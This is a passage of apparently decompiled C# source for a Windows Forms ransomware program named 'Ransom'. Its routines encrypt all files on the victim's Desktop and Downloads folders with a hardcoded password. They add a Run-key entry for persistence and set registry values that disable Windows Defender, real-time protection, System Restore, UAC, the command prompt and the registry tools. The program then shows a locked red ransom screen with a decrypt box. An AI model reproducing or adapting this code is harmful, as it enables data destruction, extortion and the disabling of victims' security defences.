				registryKey113.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
				RegistryKey registryKey114 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
				registryKey114.SetValue("MinimalX", 1, RegistryValueKind.DWord);
				RegistryKey registryKey115 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey115.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				Form2 form5 = new Form2();
				((Form)form5).ShowDialog();
			}
		}
		tmr_if.Start();
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		tmr_encrypt.Stop();
		Start_Encrypt();
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "56546578567845784378948456873456753465346765346566348723648723247686734827683425736485687534536487536487853647536487534687";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			encryptionFile.EncryptFile(files2[j], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "56546578567845784378948456873456753465346765346566348723648723247686734827683425736485687534536487536487853647536487534687";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int j = 0; j < files2.Length; j++)
		{
			decryptionFile.DecryptFile(files2[j], password);
		}
	}

	private void tmr_del_Tick(object sender, EventArgs e)
	{
		//IL_0398: Unknown result type (might be due to invalid IL or missing references)
		tmr_del.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("Ransom", Application.get_ExecutablePath().ToString());
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		registryKey2.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
		registryKey3.SetValue("DisableRoutinelyTakingAction", 1, RegistryValueKind.DWord);
		RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey4.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
		RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey5.SetValue("WindowsDefenderMAJ", 1, RegistryValueKind.DWord);
		RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
		registryKey6.SetValue("Enabled", 0, RegistryValueKind.DWord);
		RegistryKey registryKey7 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows Script Host\\Settings");
		registryKey7.SetValue("Enabled", 0, RegistryValueKind.DWord);
		RegistryKey registryKey8 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey8.SetValue("DisableSR", 1, RegistryValueKind.DWord);
		RegistryKey registryKey9 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey9.SetValue("DisableSR", 1, RegistryValueKind.DWord);
		RegistryKey registryKey10 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey10.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
		RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestores");
		registryKey11.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
		RegistryKey registryKey12 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
		registryKey12.SetValue("USBTOR", 4, RegistryValueKind.DWord);
		RegistryKey registryKey13 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
		registryKey13.SetValue("USBTOR", 4, RegistryValueKind.DWord);
		RegistryKey registryKey14 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows");
		registryKey14.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
		RegistryKey registryKey15 = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
		registryKey15.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
		RegistryKey registryKey16 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}");
		registryKey16.SetValue("Restrict_Run", 1, RegistryValueKind.DWord);
		RegistryKey registryKey17 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
		registryKey17.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
		RegistryKey registryKey18 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection");
		registryKey18.SetValue("DisableRealtimeMonitoring", 1, RegistryValueKind.DWord);
		RegistryKey registryKey19 = Registry.CurrentUser.CreateSubKey("SYSTEM\\CurrentControlSet\\Services");
		registryKey19.SetValue("SecurityHealthService", 4, RegistryValueKind.DWord);
		RegistryKey registryKey20 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey20.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
		RegistryKey registryKey21 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		registryKey21.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
		RegistryKey registryKey22 = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
		registryKey22.SetValue("MinimalX", 1, RegistryValueKind.DWord);
		RegistryKey registryKey23 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey23.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		Form2 form = new Form2();
		((Form)form).ShowDialog();
	}

	private void tmr_decrypt_Tick(object sender, EventArgs e)
	{
		tmr_decrypt.Stop();
		OFF_Encrypt();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a7: Expected O, but got Unknown
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Expected O, but got Unknown
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c8: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransom));
		button1 = new Button();
		label3 = new Label();
		textBox1 = new TextBox();
		tmr_if = new Timer(components);
		tmr_del = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_decrypt = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(276, 424));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(304, 84));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("DECRYPT");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(12, 63));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(874, 250));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text(componentResourceManager.GetString("label3.Text"));
		label3.set_TextAlign((ContentAlignment)32);
		((Control)label3).add_Click((EventHandler)label3_Click);
		((Control)textBox1).set_Location(new Point(276, 398));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(304, 20));
		((Control)textBox1).set_TabIndex(4);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(200);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		tmr_del.set_Enabled(true);
		tmr_del.set_Interval(7200000);
		tmr_del.add_Tick((EventHandler)tmr_del_Tick);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(200);
		tmr_encrypt.add_Tick((EventHandler)tmr_encrypt_Tick);
		tmr_decrypt.set_Enabled(true);
		tmr_decrypt.set_Interval(200);
		tmr_decrypt.add_Tick((EventHandler)tmr_decrypt_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Red);
		((Form)this).set_ClientSize(new Size(895, 597));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Cursor(Cursors.get_No());
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Ransom");
		((Form)this).set_ShowIcon(false);
		((Control)this).set_Text("Ransom");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Ransom_FormClosing));
		((Form)this).add_Load((EventHandler)Ransom_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
